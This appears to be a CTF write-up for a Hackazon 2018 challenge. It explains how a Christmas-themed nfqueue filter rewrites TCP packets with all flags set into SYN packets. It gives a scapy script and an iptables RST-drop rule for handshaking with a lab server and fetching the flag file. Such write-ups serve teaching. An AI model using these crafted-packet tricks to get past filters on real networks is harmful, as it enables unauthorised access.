<h3>[150] SLEIGH/RIDE stack</h3>

<p class="challenge-description">Santa has a secret protocol built on the SLEIGH/RIDE stack for exchanging XMAS packages
    information. Can you find out how to reach the web server and get access to the information? The web server is at
    RIDE 168165378 on SLEIGH 1234.</p>

<p>In this challenge only the following python code is given.</p>

<pre class="prettyprint">
#!/usr/bin/python2

import os, nfqueue
from scapy.all import TCP as SLEIGH, IP as RIDE, socket
from aenum import IntFlag as Deers

Reindeer = Deers('Reindeer', 'DASHER DANCER PRANCER VIXEN COMET CUPID DONNER BLITZEN')

def callback(i, payload):
    data = payload.get_data()
    ride = RIDE(data)

    if SLEIGH in ride:
        # all reindeer must be included in communications!
        if sum(Reindeer) == ride[SLEIGH].flags:
            ride[SLEIGH].flags = Reindeer.DANCER
            del ride[RIDE].chksum
            del ride[SLEIGH].chksum
            payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(ride), len(ride))
            return

        elif Reindeer.DANCER & ride[SLEIGH].flags:
            payload.set_verdict(nfqueue.NF_DROP)
            return

    payload.set_verdict(nfqueue.NF_ACCEPT)

def main():
    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(callback)
    q.create_queue(0)
    try:
        q.try_run()
    except:
        pass

if __name__ == "__main__":
    main()
</pre>

<p>After translating all the christmas names to its real values we can see that the program is rejecting all TCP packets
    except the ones with <code>FSRPAUEC</code> flags set, then transforming the packet to a <code>SYN</code> packet.</p>

<p>As the description specified the service is running in IP <code>168165378 = 10.6.0.2</code> and port
    <code>1234</code>.

<p>To being able to create the connection, first of all it's necessary to run the following command specifying that we
    don't want to send <code>RESET</code> packets to the host, because if not it's automaticaly sent after our <code>FSRPAUEC</code>
    packet, closing the connection.</p>

<pre class="prettyprint">
root@kali:~/hackazon/xmas_protocol# iptables -A OUTPUT -d 10.6.0.2 -p tcp --tcp-flags ALL RST -j DROP
</pre>

<p>I used the following python code to generate the TCP packets. The fist part is sending the <code>FSRPAUEC</code>
    packet, which will be transformed into a <code>SYN</code> packet, the machine will continue the three way handshake
    and send a <code>SYN/ACK</code> packet. Then from our host we will send an <code>ACK</code> packet to close the
    three way handshake. After that we will send an HTTP GET request.</p>

<pre class="prettyprint">
import sys
import socket

from scapy.all import *

sport = 9999

ip=IP(dst="10.6.0.2")
SYN=TCP(flags="FSRPAUEC", dport=1234, sport=sport)
send(ip/SYN)

my_ack = 1
my_seq = 426963182
ACK=TCP(flags="A", seq=my_ack, sport=sport, ack=my_seq, dport=1234)
send(ip/ACK)

getStr = 'GET / HTTP/1.0\r\nHost:10.6.0.2\r\nAccept-Encoding: gzip, deflate\r\n\r\n'
request = ip / TCP(dport=1234, sport=sport, seq=my_ack, ack=my_seq, flags='PA') / getStr
send(request)
</pre>

<img class="img-fluid" src="/static/img/hackazon-xmas-2018/xmas_protocol/1.PNG">

<p>The response of the HTTP GET request is the following.</p>

<pre class="prettyprint">
Line-based text data: text/html (11 lines)
    &lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">&lt;html>\n
    &lt;title>Directory listing for /&lt;/title>\n
    &lt;body>\n
    &lt;h2>Directory listing for /&lt;/h2>\n
    &lt;hr>\n
    &lt;ul>\n
    &lt;li>&lt;a href="xmas_presents.txt">xmas_presents.txt&lt;/a>\n
    &lt;/ul>\n
    &lt;hr>\n
    &lt;/body>\n
    &lt;/html>\n
</pre>

<p>As seen in the above response, a <code>xmas_presents.txt</code> file exists on the server. Make another GET request
    to view the content.</p>

<pre class="prettyprint">
getStr = 'GET /xmas_presents.txt HTTP/1.0\r\nHost:10.6.0.2\r\nAccept-Encoding: gzip, deflate\r\n\r\n'
request = ip / TCP(dport=1234, sport=sport, seq=my_ack, ack=my_seq, flags='PA') / getStr
send(request)
</pre>

<p>The flag is hidden in the txt file.</p>

<pre class="prettyprint">
Line-based text data: text/plain (3 lines)
    Here is your present!\n
    \n
    CTF{fef39080c9507b83f24c30ae114132ea}\n
</pre>